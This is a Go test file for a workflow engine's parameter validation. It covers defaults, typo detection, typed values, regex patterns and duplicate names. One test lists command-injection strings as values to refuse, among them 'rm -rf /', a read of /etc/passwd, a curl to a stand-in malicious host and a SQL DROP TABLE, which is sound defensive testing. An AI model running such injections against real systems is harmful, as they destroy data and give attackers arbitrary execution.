package workflow_test

import (
	"strings"
	"testing"

	wf "github.com/AreteAcademy/brevis/internal/domain/workflow"
)

func withParams(ps ...wf.Param) wf.Workflow {
	return wf.Workflow{
		Slug: "w", Params: ps,
		Nodes: []wf.Node{{ID: "a", Run: "echo"}},
	}
}

func TestResolveUsesTheDefaultAndTheGivenOne(t *testing.T) {
	w := withParams(
		wf.Param{Nome: "load_full", Tipo: wf.ParamBool, Default: "false"},
		wf.Param{Nome: "days", Tipo: wf.ParamInteiro, Default: "7"},
	)

	out, err := w.Resolver(map[string]string{"load_full": "true"})
	if err != nil {
		t.Fatal(err)
	}
	if out["load_full"] != "true" {
		t.Errorf("informado ignorado: %v", out)
	}
	if out["days"] != "7" {
		t.Errorf("padrao perdido: %v", out)
	}
}

// An unknown key is an ERROR, not silence: `--param lod_full=true` with a typo
// would run with the default and nobody would notice the backfill did not
// happen.
func TestAnUnknownParamIsRefused(t *testing.T) {
	w := withParams(wf.Param{Nome: "load_full", Tipo: wf.ParamBool, Default: "false"})

	_, err := w.Resolver(map[string]string{"lod_full": "true"})
	if err == nil {
		t.Fatal("a typo in the param's name went unnoticed")
	}
	if !strings.Contains(err.Error(), "load_full") {
		t.Errorf("the error does not say which ones exist: %v", err)
	}
}

func TestTiposSaoValidados(t *testing.T) {
	casos := []struct {
		param wf.Param
		valor string
		ok    bool
	}{
		{wf.Param{Nome: "b", Tipo: wf.ParamBool}, "true", true},
		{wf.Param{Nome: "b", Tipo: wf.ParamBool}, "sim", false},
		{wf.Param{Nome: "n", Tipo: wf.ParamInteiro}, "42", true},
		{wf.Param{Nome: "n", Tipo: wf.ParamInteiro}, "42.5", false},
		{wf.Param{Nome: "t", Tipo: wf.ParamTexto}, "2026-09-01", true},
		{wf.Param{Nome: "t", Tipo: wf.ParamTexto, Enum: []string{"a", "b"}}, "a", true},
		{wf.Param{Nome: "t", Tipo: wf.ParamTexto, Enum: []string{"a", "b"}}, "c", false},
		{wf.Param{Nome: "t", Tipo: wf.ParamTexto, Pattern: `^\d{4}-\d{2}-\d{2}$`}, "2026-09-01", true},
		{wf.Param{Nome: "t", Tipo: wf.ParamTexto, Pattern: `^\d{4}-\d{2}-\d{2}$`}, "ontem", false},
	}
	for _, c := range casos {
		err := c.param.Aceita(c.valor)
		if c.ok && err != nil {
			t.Errorf("%s=%q refused: %v", c.param.Tipo, c.valor, err)
		}
		if !c.ok && err == nil {
			t.Errorf("%s=%q accepted and should not be", c.param.Tipo, c.valor)
		}
	}
}

// A param's value goes INTO the step's command line, and whoever fires a run is
// not necessarily whoever wrote the workflow. Without this barrier,
// `--date {{ .data }}` with `; rm -rf /` would be arbitrary execution on the
// worker.
func TestTextRefusesAShellCharacter(t *testing.T) {
	p := wf.Param{Nome: "data", Tipo: wf.ParamTexto}

	for _, veneno := range []string{
		"; rm -rf /",
		"$(whoami)",
		"`id`",
		"a | cat /etc/passwd",
		"a && curl http://malicioso",
		"a > /tmp/x",
		"'; DROP TABLE runs; --",
	} {
		if err := p.Aceita(veneno); err == nil {
			t.Errorf("aceitou %q", veneno)
		}
	}

	// And it still serves what the real params need.
	for _, legitimo := range []string{
		"2026-09-01", "bronze_id_verification+", "true", "path/to/file.csv",
		"a,b,c", "chave=valor", "50", "us-central1",
	} {
		if err := p.Aceita(legitimo); err != nil {
			t.Errorf("it refused the legitimate value %q: %v", legitimo, err)
		}
	}
}

// Whoever genuinely needs a character outside the set declares `pattern` -- the
// decisao passa a ser explicita, do autor do workflow.
func TestPatternWidensWhatIsAccepted(t *testing.T) {
	p := wf.Param{Nome: "json", Tipo: wf.ParamTexto, Pattern: `^\{"[a-z_]+":"[a-z]+"\}$`}
	if err := p.Aceita(`{"load_full":"true"}`); err != nil {
		t.Errorf("the author's pattern was ignored: %v", err)
	}
}

// Default invalido so apareceria no primeiro disparo agendado, de madrugada.
func TestAnInvalidPatternFailsAtPublishTime(t *testing.T) {
	w := withParams(wf.Param{Nome: "days", Tipo: wf.ParamInteiro, Default: "muitos"})
	if err := w.Validate(); err == nil {
		t.Fatal("an invalid default value passed validation")
	}
}

func TestAnInvalidDeclarationIsRefused(t *testing.T) {
	casos := []wf.Param{
		{Nome: "Load_Full", Tipo: wf.ParamBool},          // maiuscula
		{Nome: "2days", Tipo: wf.ParamInteiro},           // starts with a digit
		{Nome: "ok", Tipo: "float"},                      // tipo inexistente
		{Nome: "ok"},                                     // no type
		{Nome: "ok", Tipo: wf.ParamTexto, Pattern: "[("}, // regex quebrada
	}
	for _, p := range casos {
		if err := p.Validate(); err == nil {
			t.Errorf("declaracao invalida aceita: %+v", p)
		}
	}
}

func TestADuplicateParamIsRefused(t *testing.T) {
	w := withParams(
		wf.Param{Nome: "x", Tipo: wf.ParamTexto},
		wf.Param{Nome: "x", Tipo: wf.ParamBool},
	)
	if err := w.Validate(); err == nil {
		t.Fatal("a duplicate param got through")
	}
}
